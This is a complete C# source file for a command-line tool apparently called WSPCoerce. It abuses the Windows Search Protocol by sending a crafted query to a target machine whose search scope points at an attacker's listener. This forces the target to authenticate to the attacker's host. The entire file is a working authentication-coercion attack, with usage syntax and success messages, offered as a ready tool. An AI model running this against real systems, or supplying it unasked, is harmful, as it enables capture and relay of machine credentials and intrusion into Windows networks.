using System;
using System.Data.OleDb;

namespace WSPCoerce
{
    class Program
    {
        const string connectionString = "Provider=Search.CollatorDSO;Extended Properties=\"Application=Windows\"";

        static void ExecuteQuery(string query)
        {
            OleDbDataReader myDataReader = null;
            OleDbConnection myOleDbConnection = new OleDbConnection(connectionString);
            OleDbCommand myOleDbCommand = new OleDbCommand(query, myOleDbConnection);
            try
            {
                myOleDbConnection.Open();
                myDataReader = myOleDbCommand.ExecuteReader();
            }
            catch (System.Data.OleDb.OleDbException oleDbException)
            {
                if ((uint)oleDbException.ErrorCode == 0x80040718L) {
                    Console.WriteLine("[+] OleDbException - Error 0x{0:X}L", oleDbException.ErrorCode);
                    Console.WriteLine("[+] Search query successfully sent to the target");
                }
                else {
                    Console.WriteLine("[-] OleDbException - Error 0x{0:X}L", oleDbException.ErrorCode);
                    for (int i = 0; i < oleDbException.Errors.Count; i++)
                    {
                        Console.WriteLine("    Message: " + oleDbException.Errors[i].Message);
                    }
                }
            }
            finally
            {
                if (myDataReader != null)
                {
                    myDataReader.Close();
                    myDataReader.Dispose();
                }
                if (myOleDbConnection.State == System.Data.ConnectionState.Open)
                {
                    myOleDbConnection.Close();
                }
            }
        }

        static void Main(string[] args)
        {
            if (args.Length != 2)
            {
                Console.WriteLine("WSPCoerce.exe <target> <listener>");
                return;
            }

            string target = args[0];
            string listener = args[1];

            string query = "SELECT TOP 10 System.ItemFolderPathDisplay, System.ItemName FROM "
                + target
                + ".SystemIndex WHERE SCOPE='file:////"
                + listener
                + "/SomeFolder'";
            ExecuteQuery(query);
        }
    }
}
